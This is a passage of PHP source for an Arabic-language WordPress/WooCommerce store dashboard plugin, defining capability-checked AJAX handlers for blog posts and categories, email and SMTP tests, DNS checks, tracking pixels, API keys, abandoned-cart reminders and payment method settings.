    $status  = sanitize_key( wp_unslash( $_POST['status'] ?? 'draft' ) );
    if ( ! in_array( $status, array( 'publish', 'draft', 'pending' ), true ) ) {
        $status = 'draft';
    }

    if ( $title === '' ) {
        wp_send_json_error( array( 'message' => 'عنوان المقال مطلوب.' ) );
    }

    $data = array(
        'post_title'   => $title,
        'post_content' => $content,
        'post_excerpt' => $excerpt,
        'post_status'  => $status,
        'post_type'    => 'post',
    );

    if ( $post_id > 0 ) {
        $existing = get_post( $post_id );
        if ( ! $existing || $existing->post_type !== 'post' ) {
            wp_send_json_error( array( 'message' => 'المقال غير موجود.' ) );
        }
        $data['ID'] = $post_id;
        $result     = wp_update_post( $data, true );
    } else {
        $result = wp_insert_post( $data, true );
    }

    if ( is_wp_error( $result ) ) {
        wp_send_json_error( array( 'message' => $result->get_error_message() ) );
    }

    $post_id = (int) $result;
    $thumb   = absint( $_POST['featured_image'] ?? 0 );
    if ( $thumb > 0 ) {
        set_post_thumbnail( $post_id, $thumb );
    } else {
        delete_post_thumbnail( $post_id );
    }

    $cat_id = absint( $_POST['category_id'] ?? 0 );
    if ( $cat_id > 0 ) {
        wp_set_post_categories( $post_id, array( $cat_id ) );
    } else {
        wp_set_post_categories( $post_id, array() );
    }

    wp_send_json_success(
        array(
            'post_id'   => $post_id,
            'permalink' => get_permalink( $post_id ),
        )
    );
}

add_action( 'wp_ajax_yamamah_delete_blog_post', 'yamamah_ajax_delete_blog_post' );
function yamamah_ajax_delete_blog_post() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_options' ) ) {
        wp_send_json_error( array( 'message' => 'غير مصرح لك' ) );
    }

    $post_id = absint( $_POST['post_id'] ?? 0 );
    if ( $post_id <= 0 ) {
        wp_send_json_error( array( 'message' => 'معرّف المقال غير صالح.' ) );
    }

    $post = get_post( $post_id );
    if ( ! $post || $post->post_type !== 'post' ) {
        wp_send_json_error( array( 'message' => 'المقال غير موجود.' ) );
    }

    $deleted = wp_trash_post( $post_id );
    if ( ! $deleted ) {
        wp_send_json_error( array( 'message' => 'تعذّر حذف المقال.' ) );
    }

    wp_send_json_success();
}

add_action( 'wp_ajax_yamamah_save_blog_category', 'yamamah_ajax_save_blog_category' );
function yamamah_ajax_save_blog_category() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_options' ) ) {
        wp_send_json_error( array( 'message' => 'غير مصرح لك' ) );
    }
    if ( ! function_exists( 'yamamah_theme_has_blog_settings' ) || ! yamamah_theme_has_blog_settings() ) {
        wp_send_json_error( array( 'message' => 'الثيم الحالي لا يدعم المدونة' ) );
    }

    $term_id     = absint( $_POST['term_id'] ?? 0 );
    $name        = sanitize_text_field( wp_unslash( $_POST['name'] ?? '' ) );
    $slug        = sanitize_title( wp_unslash( $_POST['slug'] ?? '' ) );
    $description = sanitize_textarea_field( wp_unslash( $_POST['description'] ?? '' ) );

    if ( $name === '' ) {
        wp_send_json_error( array( 'message' => 'اسم التصنيف مطلوب.' ) );
    }

    $args = array(
        'description' => $description,
    );
    if ( $slug !== '' ) {
        $args['slug'] = $slug;
    }

    if ( $term_id > 0 ) {
        $existing = get_term( $term_id, 'category' );
        if ( ! $existing || is_wp_error( $existing ) ) {
            wp_send_json_error( array( 'message' => 'التصنيف غير موجود.' ) );
        }
        $args['name'] = $name;
        $result       = wp_update_term( $term_id, 'category', $args );
    } else {
        $args['name'] = $name;
        $result       = wp_insert_term( $name, 'category', $args );
    }

    if ( is_wp_error( $result ) ) {
        wp_send_json_error( array( 'message' => $result->get_error_message() ) );
    }

    $saved_id = is_array( $result ) && isset( $result['term_id'] ) ? (int) $result['term_id'] : $term_id;

    wp_send_json_success( array( 'term_id' => $saved_id ) );
}

add_action( 'wp_ajax_yamamah_delete_blog_category', 'yamamah_ajax_delete_blog_category' );
function yamamah_ajax_delete_blog_category() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_options' ) ) {
        wp_send_json_error( array( 'message' => 'غير مصرح لك' ) );
    }

    $term_id     = absint( $_POST['term_id'] ?? 0 );
    $default_cat = (int) get_option( 'default_category' );

    if ( $term_id <= 0 ) {
        wp_send_json_error( array( 'message' => 'معرّف التصنيف غير صالح.' ) );
    }
    if ( $term_id === $default_cat ) {
        wp_send_json_error( array( 'message' => 'لا يمكن حذف التصنيف الافتراضي.' ) );
    }

    $term = get_term( $term_id, 'category' );
    if ( ! $term || is_wp_error( $term ) ) {
        wp_send_json_error( array( 'message' => 'التصنيف غير موجود.' ) );
    }

    $result = wp_delete_term( $term_id, 'category' );
    if ( is_wp_error( $result ) ) {
        wp_send_json_error( array( 'message' => $result->get_error_message() ) );
    }
    if ( ! $result ) {
        wp_send_json_error( array( 'message' => 'تعذّر حذف التصنيف.' ) );
    }

    wp_send_json_success();
}

add_action( 'wp_ajax_yamamah_sync_theme_pages', 'yamamah_ajax_sync_theme_pages' );
function yamamah_ajax_sync_theme_pages() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_options' ) ) {
        wp_send_json_error( array( 'message' => 'غير مصرح لك' ) );
    }

    do_action( 'ydash_sync_pages' );

    wp_send_json_success(
        array(
            'blog_exists' => (bool) get_page_by_path( 'blog' ),
        )
    );
}

/**
 * روابط التواصل الاجتماعي النشطة بترتيب ثابت (للفوتر في الثيمات).
 *
 * @return array<string,string> مفتاح المنصة => رابط معتمد
 */
function yamamah_get_ordered_social_links() {
    $all = get_option( 'yamamah_social_links', array() );
    if ( ! is_array( $all ) ) {
        return array();
    }
    $order = array( 'x', 'instagram', 'facebook', 'tiktok', 'snapchat', 'linkedin', 'youtube' );
    $out   = array();
    foreach ( $order as $key ) {
        if ( ! empty( $all[ $key ] ) && is_string( $all[ $key ] ) ) {
            $url = esc_url( $all[ $key ] );
            if ( $url !== '' ) {
                $out[ $key ] = $url;
            }
        }
    }
    return $out;
}

// ======== AJAX: Test Contact Email ========
add_action( 'wp_ajax_yamamah_test_contact_email', 'yamamah_ajax_test_contact_email' );
function yamamah_ajax_test_contact_email() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_options' ) ) {
        wp_send_json_error( 'غير مصرح لك' );
    }

    $to = get_option( 'yamamah_contact_form_recipient', get_option( 'admin_email' ) );
    if ( ! is_email( $to ) ) {
        wp_send_json_error( 'البريد المستقبل غير صحيح' );
    }

    $subject = 'رسالة تجريبية من صفحة تواصل معنا';
    $message = 'مرحباً، هذه رسالة تجريبية لاختبار إعدادات SMTP الخاصة بفورم التواصل في متجرك.';

    $sent = wp_mail( $to, $subject, $message );
    if ( $sent ) {
        wp_send_json_success( 'تم الإرسال بنجاح إلى ' . $to );
    } else {
        wp_send_json_error( 'فشل الإرسال، يرجى مراجعة إعدادات SMTP' );
    }
}

// ======== AJAX: Save Email Settings ========
add_action( 'wp_ajax_yamamah_save_email_settings', 'yamamah_ajax_save_email_settings' );
function yamamah_ajax_save_email_settings() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_options' ) ) {
        wp_send_json_error( 'غير مصرح' );
    }

    $allowed = array(
        'woocommerce_email_from_name',
        'woocommerce_email_from_address',
        'woocommerce_email_header_image',
        'woocommerce_email_footer_text',
        'woocommerce_email_base_color',
        'woocommerce_email_background_color',
        'woocommerce_email_body_background_color',
        'woocommerce_email_text_color',
    );

    $settings = isset( $_POST['settings'] ) ? $_POST['settings'] : array();
    foreach ( $settings as $key => $value ) {
        if ( in_array( $key, $allowed, true ) ) {
            update_option( sanitize_key( $key ), sanitize_text_field( $value ) );
        }
    }

    $smtp = isset( $_POST['smtp'] ) ? $_POST['smtp'] : array();
    if ( ! empty( $smtp ) ) {
        $smtp_allowed = array(
            'yamamah_smtp_enabled'    => 'no',
            'yamamah_smtp_host'       => '',
            'yamamah_smtp_port'       => '587',
            'yamamah_smtp_encryption' => 'tls',
            'yamamah_smtp_username'   => '',
        );
        foreach ( $smtp_allowed as $key => $default ) {
            if ( isset( $smtp[ $key ] ) ) {
                update_option( $key, sanitize_text_field( $smtp[ $key ] ) );
            }
        }
        if ( isset( $smtp['yamamah_smtp_password'] ) && $smtp['yamamah_smtp_password'] !== '' ) {
            update_option( 'yamamah_smtp_password', sanitize_text_field( $smtp['yamamah_smtp_password'] ) );
        }
    }

    wp_send_json_success( 'تم الحفظ بنجاح' );
}

// ======== AJAX: Send Test Email ========
add_action( 'wp_ajax_yamamah_send_test_email', 'yamamah_ajax_send_test_email' );
function yamamah_ajax_send_test_email() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_options' ) ) {
        wp_send_json_error( 'غير مصرح' );
    }

    $current_user = wp_get_current_user();
    $to           = $current_user->user_email;
    $subject      = 'بريد تجريبي من ' . get_bloginfo( 'name' );
    $body         = '<div style="font-family:Tahoma,Arial,sans-serif;direction:rtl;padding:20px;">';
    $body        .= '<h2 style="color:' . esc_attr( get_option( 'woocommerce_email_base_color', '#7f54b3' ) ) . ';">بريد تجريبي</h2>';
    $body        .= '<p>هذه رسالة تجريبية من لوحة تحكم اليمامة للتحقق من إعدادات البريد الإلكتروني.</p>';
    $body        .= '<p>إذا وصلتك هذه الرسالة، فإن إعدادات SMTP تعمل بشكل صحيح.</p>';
    $body        .= '<hr style="border:none;border-top:1px solid #eee;margin:20px 0;">';
    $body        .= '<small style="color:#999;">تم الإرسال في: ' . current_time( 'Y-m-d H:i:s' ) . '</small>';
    $body        .= '</div>';

    $headers = array( 'Content-Type: text/html; charset=UTF-8' );

    $sent = wp_mail( $to, $subject, $body, $headers );
    if ( $sent ) {
        wp_send_json_success( 'تم إرسال البريد التجريبي إلى ' . $to );
    } else {
        global $phpmailer;
        $error_msg = 'فشل إرسال البريد التجريبي';
        if ( isset( $phpmailer ) && is_object( $phpmailer ) && ! empty( $phpmailer->ErrorInfo ) ) {
            $error_msg .= ': ' . $phpmailer->ErrorInfo;
        }
        wp_send_json_error( $error_msg );
    }
}

// ======== AJAX: Check Email DNS Records ========
add_action( 'wp_ajax_yamamah_check_email_dns', 'yamamah_ajax_check_email_dns' );
function yamamah_ajax_check_email_dns() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_options' ) ) wp_send_json_error( 'غير مصرح' );

    $domain = sanitize_text_field( $_POST['domain'] ?? '' );
    if ( empty( $domain ) ) wp_send_json_error( 'أدخل الدومين' );

    $domain = preg_replace( '/^https?:\/\//', '', $domain );
    $domain = rtrim( $domain, '/' );

    $results = array( 'mx' => false, 'mx_records' => array(), 'spf' => false, 'dmarc' => false );

    $mx = @dns_get_record( $domain, DNS_MX );
    if ( ! empty( $mx ) ) {
        $results['mx'] = true;
        $results['mx_records'] = array_map( function( $r ) { return $r['target'] ?? ''; }, $mx );
    }

    $txt = @dns_get_record( $domain, DNS_TXT );
    if ( ! empty( $txt ) ) {
        foreach ( $txt as $r ) {
            if ( isset( $r['txt'] ) && strpos( $r['txt'], 'v=spf1' ) !== false ) {
                $results['spf'] = true;
                break;
            }
        }
    }

    $dmarc = @dns_get_record( "_dmarc.{$domain}", DNS_TXT );
    if ( ! empty( $dmarc ) ) {
        $results['dmarc'] = true;
    }

    wp_send_json_success( $results );
}

// ======== AJAX: Save Tracking Settings ========
add_action( 'wp_ajax_yamamah_save_tracking_settings', 'yamamah_ajax_save_tracking_settings' );
function yamamah_ajax_save_tracking_settings() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_options' ) ) wp_send_json_error( 'غير مصرح' );

    $fields = array( 'gtm_id', 'ga4_id', 'fb_pixel_id', 'tiktok_pixel_id', 'snap_pixel_id', 'twitter_pixel_id', 'pinterest_tag_id' );
    $toggles = array( 'gtm', 'ga4', 'fb_pixel', 'tiktok', 'snap', 'twitter', 'pinterest' );

    $settings = array();
    foreach ( $toggles as $key ) {
        $settings[ $key . '_enabled' ] = ( $_POST[ $key . '_enabled' ] ?? 'no' ) === 'yes' ? 'yes' : 'no';
    }
    foreach ( $fields as $f ) {
        $settings[ $f ] = sanitize_text_field( $_POST[ $f ] ?? '' );
    }
    $settings['custom_head_code'] = wp_unslash( $_POST['custom_head_code'] ?? '' );

    update_option( 'yamamah_tracking_settings', $settings );
    wp_send_json_success( 'تم الحفظ' );
}

// ======== AJAX: Verify Tracking Installation ========
add_action( 'wp_ajax_yamamah_verify_tracking', 'yamamah_ajax_verify_tracking' );
function yamamah_ajax_verify_tracking() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_options' ) ) wp_send_json_error( 'غير مصرح' );

    $t = get_option( 'yamamah_tracking_settings', array() );
    $home_url = home_url( '/' );

    $response = wp_remote_get( $home_url, array(
        'timeout'    => 15,
        'sslverify'  => false,
        'user-agent' => 'YamamahTrackingVerifier/1.0',
    ) );

    $body = '';
    if ( ! is_wp_error( $response ) ) {
        $body = wp_remote_retrieve_body( $response );
    }

    $platforms = array(
        array( 'key' => 'gtm',       'label' => 'Google Tag Manager', 'field' => 'gtm_id',          'search' => 'googletagmanager.com/gtm.js' ),
        array( 'key' => 'ga4',       'label' => 'Google Analytics 4', 'field' => 'ga4_id',           'search' => 'googletagmanager.com/gtag/js' ),
        array( 'key' => 'fb_pixel',  'label' => 'Meta (Facebook) Pixel', 'field' => 'fb_pixel_id',   'search' => 'connect.facebook.net' ),
        array( 'key' => 'tiktok',    'label' => 'TikTok Pixel',       'field' => 'tiktok_pixel_id',  'search' => 'analytics.tiktok.com' ),
        array( 'key' => 'snap',      'label' => 'Snapchat Pixel',     'field' => 'snap_pixel_id',    'search' => 'sc-static.net/scevent.min.js' ),
        array( 'key' => 'twitter',   'label' => 'Twitter / X Pixel',  'field' => 'twitter_pixel_id', 'search' => 'static.ads-twitter.com' ),
        array( 'key' => 'pinterest', 'label' => 'Pinterest Tag',      'field' => 'pinterest_tag_id', 'search' => 'pintrk' ),
    );

    $results = array();
    foreach ( $platforms as $p ) {
        $enabled = ( $t[ $p['key'] . '_enabled' ] ?? 'no' ) === 'yes';
        $id_val  = $t[ $p['field'] ] ?? '';

        if ( ! $enabled ) {
            $results[] = array( 'label' => $p['label'], 'status' => 'disabled', 'id_val' => '' );
            continue;
        }
        if ( empty( $id_val ) ) {
            $results[] = array( 'label' => $p['label'], 'status' => 'no_id', 'id_val' => '' );
            continue;
        }
        if ( empty( $body ) ) {
            $results[] = array( 'label' => $p['label'], 'status' => 'error', 'id_val' => $id_val );
            continue;
        }

        $found = ( stripos( $body, $p['search'] ) !== false ) || ( stripos( $body, $id_val ) !== false );
        $results[] = array(
            'label'  => $p['label'],
            'status' => $found ? 'installed' : 'not_found',
            'id_val' => $id_val,
        );
    }

    wp_send_json_success( $results );
}

// ======== AJAX: Create API Key ========
add_action( 'wp_ajax_yamamah_create_api_key', 'yamamah_ajax_create_api_key' );
function yamamah_ajax_create_api_key() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_options' ) ) wp_send_json_error( 'غير مصرح' );

    $description = sanitize_text_field( $_POST['description'] ?? '' );
    $permissions = sanitize_text_field( $_POST['permissions'] ?? 'read' );

    if ( empty( $description ) ) wp_send_json_error( 'يرجى إدخال وصف للمفتاح' );
    if ( ! in_array( $permissions, array( 'read', 'write', 'read_write' ), true ) ) {
        $permissions = 'read';
    }

    if ( ! function_exists( 'wc_rand_hash' ) || ! function_exists( 'wc_api_hash' ) ) {
        wp_send_json_error( 'خطأ: وظائف المتجر غير متاحة' );
    }

    global $wpdb;
    $table = $wpdb->prefix . 'woocommerce_api_keys';

    $consumer_key    = 'ck_' . wc_rand_hash();
    $consumer_secret = 'cs_' . wc_rand_hash();

    $result = $wpdb->insert( $table, array(
        'user_id'         => get_current_user_id(),
        'description'     => $description,
        'permissions'     => $permissions,
        'consumer_key'    => wc_api_hash( $consumer_key ),
        'consumer_secret' => $consumer_secret,
        'truncated_key'   => substr( $consumer_key, -7 ),
    ), array( '%d', '%s', '%s', '%s', '%s', '%s' ) );

    if ( ! $result ) {
        wp_send_json_error( 'فشل إنشاء المفتاح' );
    }

    wp_send_json_success( array(
        'key_id'          => $wpdb->insert_id,
        'consumer_key'    => $consumer_key,
        'consumer_secret' => $consumer_secret,
        'truncated_key'   => substr( $consumer_key, -7 ),
    ) );
}

// ======== AJAX: Revoke API Key ========
add_action( 'wp_ajax_yamamah_revoke_api_key', 'yamamah_ajax_revoke_api_key' );
function yamamah_ajax_revoke_api_key() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_options' ) ) wp_send_json_error( 'غير مصرح' );

    $key_id = absint( $_POST['key_id'] ?? 0 );
    if ( ! $key_id ) wp_send_json_error( 'معرّف غير صالح' );

    global $wpdb;
    $table = $wpdb->prefix . 'woocommerce_api_keys';
    $deleted = $wpdb->delete( $table, array( 'key_id' => $key_id ), array( '%d' ) );

    if ( $deleted ) {
        wp_send_json_success( 'تم إلغاء المفتاح' );
    } else {
        wp_send_json_error( 'فشل إلغاء المفتاح' );
    }
}

// ======== AJAX: Toggle Email Notification ========
add_action( 'wp_ajax_yamamah_toggle_email_notification', 'yamamah_ajax_toggle_email_notification' );
function yamamah_ajax_toggle_email_notification() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_options' ) ) {
        wp_send_json_error( 'غير مصرح' );
    }

    $email_id = isset( $_POST['email_id'] ) ? sanitize_text_field( $_POST['email_id'] ) : '';
    $enabled  = isset( $_POST['enabled'] ) ? sanitize_text_field( $_POST['enabled'] ) : '';

    if ( ! $email_id || ! in_array( $enabled, array( 'yes', 'no' ), true ) ) {
        wp_send_json_error( 'بيانات غير صالحة' );
    }

    $option_key = 'woocommerce_' . $email_id . '_settings';
    $current    = get_option( $option_key, array() );
    if ( ! is_array( $current ) ) $current = array();
    $current['enabled'] = $enabled;
    update_option( $option_key, $current );

    wp_send_json_success();
}

// ======== AJAX: Send Abandoned Cart Reminder (single) ========
add_action( 'wp_ajax_yamamah_send_cart_reminder', 'yamamah_ajax_send_cart_reminder' );
function yamamah_ajax_send_cart_reminder() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_woocommerce' ) ) wp_send_json_error( 'غير مصرح' );

    global $wpdb;
    $table   = $wpdb->prefix . 'yamamah_abandoned_carts';
    $cart_id = absint( $_POST['cart_id'] ?? 0 );

    $cart = $wpdb->get_row( $wpdb->prepare( "SELECT * FROM {$table} WHERE id = %d", $cart_id ) );
    if ( ! $cart || empty( $cart->customer_email ) ) {
        wp_send_json_error( 'سلة غير صالحة أو بدون بريد إلكتروني' );
    }

    $sent = yamamah_send_cart_reminder_email( $cart );
    if ( $sent ) {
        $wpdb->update( $table, array( 'reminder_sent' => $cart->reminder_sent + 1 ), array( 'id' => $cart_id ), array( '%d' ), array( '%d' ) );
        wp_send_json_success( 'تم إرسال التذكير' );
    } else {
        wp_send_json_error( 'فشل إرسال البريد' );
    }
}

// ======== AJAX: Bulk Send Reminders (with optional coupon) ========
add_action( 'wp_ajax_yamamah_bulk_cart_reminder', 'yamamah_ajax_bulk_cart_reminder' );
function yamamah_ajax_bulk_cart_reminder() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_woocommerce' ) ) wp_send_json_error( 'غير مصرح' );

    global $wpdb;
    $table    = $wpdb->prefix . 'yamamah_abandoned_carts';
    $cart_ids = isset( $_POST['cart_ids'] ) ? array_map( 'absint', (array) $_POST['cart_ids'] ) : array();
    $cart_ids = array_filter( $cart_ids );

    if ( empty( $cart_ids ) ) wp_send_json_error( 'لم يتم تحديد سلات' );

    $coupon_settings = null;
    if ( ! empty( $_POST['coupon_enabled'] ) && $_POST['coupon_enabled'] === 'yes' ) {
        $coupon_settings = array(
            'coupon_enabled'    => 'yes',
            'coupon_type'       => sanitize_text_field( $_POST['coupon_type'] ?? 'percent' ),
            'coupon_amount'     => floatval( $_POST['coupon_amount'] ?? 10 ),
            'coupon_expiry'     => intval( $_POST['coupon_expiry'] ?? 3 ),
            'coupon_min_amount' => floatval( $_POST['coupon_min_amount'] ?? 0 ),
        );
    }

    $sent_count   = 0;
    $failed_count = 0;
    $coupons_list = array();

    $placeholders = implode( ',', array_fill( 0, count( $cart_ids ), '%d' ) );
    $carts = $wpdb->get_results( $wpdb->prepare(
        "SELECT * FROM {$table} WHERE id IN ({$placeholders})",
        ...$cart_ids
    ) );

    foreach ( $carts as $cart ) {
        if ( empty( $cart->customer_email ) ) { $failed_count++; continue; }

        $coupon_code = '';
        if ( $coupon_settings ) {
            $coupon_code = yamamah_create_cart_coupon( $cart, $coupon_settings );
            $coupons_list[] = array( 'cart_id' => $cart->id, 'name' => $cart->customer_name, 'code' => $coupon_code );
        }

        $ok = yamamah_send_cart_reminder_email( $cart, $coupon_code );
        if ( $ok ) {
            $wpdb->update( $table, array( 'reminder_sent' => $cart->reminder_sent + 1 ), array( 'id' => $cart->id ), array( '%d' ), array( '%d' ) );
            $sent_count++;
        } else {
            $failed_count++;
        }
    }

    wp_send_json_success( array(
        'sent'    => $sent_count,
        'failed'  => $failed_count,
        'coupons' => $coupons_list,
    ) );
}

// ======== AJAX: Save Abandoned Cart Settings ========
add_action( 'wp_ajax_yamamah_save_abandoned_settings', 'yamamah_ajax_save_abandoned_settings' );
function yamamah_ajax_save_abandoned_settings() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_woocommerce' ) ) wp_send_json_error( 'غير مصرح' );

    $minutes = max( 15, min( 60, intval( $_POST['abandon_minutes'] ?? 30 ) ) );
    update_option( 'yamamah_abandon_minutes', $minutes );

    $settings = array(
        'auto_enabled'      => sanitize_text_field( $_POST['auto_enabled'] ?? 'no' ),
        'auto_delay'        => max( 15, min( 120, intval( $_POST['auto_delay'] ?? 45 ) ) ),
        'auto_max_reminders'=> max( 1, min( 3, intval( $_POST['auto_max_reminders'] ?? 1 ) ) ),
        'coupon_enabled'    => sanitize_text_field( $_POST['coupon_enabled'] ?? 'no' ),
        'coupon_type'       => in_array( $_POST['coupon_type'] ?? '', array( 'percent', 'fixed_cart' ), true ) ? $_POST['coupon_type'] : 'percent',
        'coupon_amount'     => max( 0, floatval( $_POST['coupon_amount'] ?? 10 ) ),
        'coupon_expiry'     => max( 1, intval( $_POST['coupon_expiry'] ?? 3 ) ),
        'coupon_min_amount' => max( 0, floatval( $_POST['coupon_min_amount'] ?? 0 ) ),
    );
    update_option( 'yamamah_abandoned_settings', $settings );
    wp_send_json_success( 'تم الحفظ بنجاح' );
}

// ======== AJAX: Save Abandon Minutes Setting (legacy) ========
add_action( 'wp_ajax_yamamah_save_abandon_minutes', 'yamamah_ajax_save_abandon_minutes' );
function yamamah_ajax_save_abandon_minutes() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_woocommerce' ) ) wp_send_json_error( 'غير مصرح' );
    $minutes = max( 15, min( 60, intval( $_POST['minutes'] ?? 30 ) ) );
    update_option( 'yamamah_abandon_minutes', $minutes );
    wp_send_json_success();
}

// ======== AJAX: Delete Abandoned Cart ========
add_action( 'wp_ajax_yamamah_delete_abandoned_cart', 'yamamah_ajax_delete_abandoned_cart' );
function yamamah_ajax_delete_abandoned_cart() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_woocommerce' ) ) {
        wp_send_json_error( 'غير مصرح' );
    }

    global $wpdb;
    $table   = $wpdb->prefix . 'yamamah_abandoned_carts';
    $cart_id = isset( $_POST['cart_id'] ) ? absint( $_POST['cart_id'] ) : 0;

    if ( $cart_id ) {
        $wpdb->delete( $table, array( 'id' => $cart_id ), array( '%d' ) );
    }

    wp_send_json_success();
}

// ======== AJAX: Save Home Content ========
add_action( 'wp_ajax_yamamah_save_home_content', 'yamamah_ajax_save_home_content' );
function yamamah_ajax_save_home_content() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );

    if ( ! current_user_can( 'manage_options' ) ) {
        wp_send_json_error( 'غير مصرح' );
    }

    $raw = isset( $_POST['home_content'] ) && is_array( $_POST['home_content'] ) ? wp_unslash( $_POST['home_content'] ) : array();
    $saved = function_exists( 'yamamah_sanitize_home_content_tree' ) ? yamamah_sanitize_home_content_tree( $raw ) : array();

    do_action( 'ydash_save_homepage_settings', $saved );
    wp_send_json_success( 'تم الحفظ بنجاح' );
}

// ======== AJAX: Restore Home Content ========
add_action( 'wp_ajax_yamamah_restore_home_content', 'yamamah_ajax_restore_home_content' );
function yamamah_ajax_restore_home_content() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );

    if ( ! current_user_can( 'manage_options' ) ) {
        wp_send_json_error( 'غير مصرح' );
    }

    do_action( 'ydash_restore_homepage_settings' );
    wp_send_json_success( 'تم استعادة المحتوى الأصلي' );
}

// ======== AJAX: Toggle Payment Method ========
add_action( 'wp_ajax_yamamah_toggle_payment_method', 'yamamah_ajax_toggle_payment_method' );
function yamamah_ajax_toggle_payment_method() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );

    if ( ! current_user_can( 'manage_woocommerce' ) ) {
        wp_send_json_error( 'غير مصرح' );
    }

    $method_id = sanitize_text_field( $_POST['method_id'] ?? '' );
    $raw       = $_POST['enabled'] ?? false;
    $enabled   = ( $raw === true || $raw === 1 || $raw === '1' || $raw === 'true' || $raw === 'yes' );

    if ( empty( $method_id ) ) {
        wp_send_json_error( 'معرف الطريقة مفقود' );
    }

    $methods = get_option( 'yamamah_payment_methods', array() );
    if ( ! is_array( $methods ) ) $methods = array();
    $methods[ $method_id ] = $enabled;
    update_option( 'yamamah_payment_methods', $methods );

    wp_send_json_success( array( 'method_id' => $method_id, 'enabled' => $enabled ) );
}

// ======== AJAX: Get Payment Methods (for mobile / REST) ========
add_action( 'wp_ajax_yamamah_get_payment_methods', 'yamamah_ajax_get_payment_methods' );
function yamamah_ajax_get_payment_methods() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_woocommerce' ) ) {
        wp_send_json_error( 'غير مصرح' );
    }

    $electronic_allowed = ! function_exists( 'yamamah_plan_allows' ) || yamamah_plan_allows( 'electronic_payment' );
    $electronic_methods = array( 'mada', 'visa-master', 'apple-pay', 'stc-pay', 'tabby', 'tamara' );

    $default_methods = array(
        array( 'id' => 'mada',          'name' => 'مدى',                  'description' => 'الدفع عبر بطاقات مدى المحلية',                  'fee' => '1.75%', 'electronic' => true ),
        array( 'id' => 'visa-master',   'name' => 'Visa / Mastercard',    'description' => 'الدفع عبر بطاقات فيزا وماستركارد الائتمانية',    'fee' => '2.50%', 'electronic' => true ),
        array( 'id' => 'apple-pay',     'name' => 'Apple Pay',            'description' => 'الدفع السريع عبر أجهزة أبل',                     'fee' => '2.00%', 'electronic' => true ),
        array( 'id' => 'stc-pay',       'name' => 'STC Pay',              'description' => 'الدفع عبر محفظة STC Pay',                        'fee' => '1.50%', 'electronic' => true ),
        array( 'id' => 'tabby',         'name' => 'Tabby - تقسيط',       'description' => 'الدفع بالتقسيط على 4 دفعات بدون فوائد',          'fee' => '5.00%', 'electronic' => true ),
        array( 'id' => 'tamara',        'name' => 'Tamara - تمارا',      'description' => 'اشتر الآن وادفع لاحقاً عبر تمارا',               'fee' => '4.50%', 'electronic' => true ),
        array( 'id' => 'bank-transfer', 'name' => 'تحويل بنكي',          'description' => 'الدفع عبر التحويل البنكي المباشر',                'fee' => '0%',    'electronic' => false ),
        array( 'id' => 'cod',           'name' => 'الدفع عند الاستلام',  'description' => 'الدفع نقداً عند استلام الطلب',                    'fee' => '0%',    'electronic' => false ),
    );

    $enabled_defaults = array( 'mada', 'visa-master', 'apple-pay', 'bank-transfer', 'cod' );
    $saved            = get_option( 'yamamah_payment_methods', array() );
    if ( ! is_array( $saved ) ) {
        $saved = array();
    }

    $methods = array();
    foreach ( $default_methods as $m ) {
        $is_electronic = in_array( $m['id'], $electronic_methods, true );
        $blocked       = $is_electronic && ! $electronic_allowed;
        if ( isset( $saved[ $m['id'] ] ) ) {
            $enabled = (bool) $saved[ $m['id'] ];
        } else {
            $enabled = in_array( $m['id'], $enabled_defaults, true );
        }
        if ( $blocked ) {
            $enabled = false;
        }
        $methods[] = array_merge(
            $m,
            array(
                'enabled' => $enabled,
                'blocked' => $blocked,
            )
        );
    }

    wp_send_json_success(
        array(
            'methods'            => $methods,
            'electronic_allowed' => $electronic_allowed,
        )
    );
}

// ======== AJAX: Get Payment Settings (for mobile / REST) ========
add_action( 'wp_ajax_yamamah_get_payment_settings', 'yamamah_ajax_get_payment_settings' );
function yamamah_ajax_get_payment_settings() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_woocommerce' ) ) {
        wp_send_json_error( 'غير مصرح' );
    }

    $settings = get_option( 'yamamah_payment_settings', array() );
    if ( ! is_array( $settings ) ) {
        $settings = array();
    }

    $electronic_allowed = ! function_exists( 'yamamah_plan_allows' ) || yamamah_plan_allows( 'electronic_payment' );

    wp_send_json_success(
        array(
            'settings'           => $settings,
            'electronic_allowed' => $electronic_allowed,
            'tap'                => array(
                'merchant_id' => (string) get_option( 'yamama_tap_merchant_id', '' ),
                'livemode'    => (int) get_option( 'yamama_tap_livemode', 0 ),
                'lead_id'     => (string) get_option( 'yamama_tap_lead_id', '' ),
                'status'      => (string) get_option( 'yamama_tap_status', '' ),
                'connect_url' => (string) get_option( 'yamama_tap_connect_url', '' ),
            ),
        )
    );
}

// ======== AJAX: Save Payment Settings ========
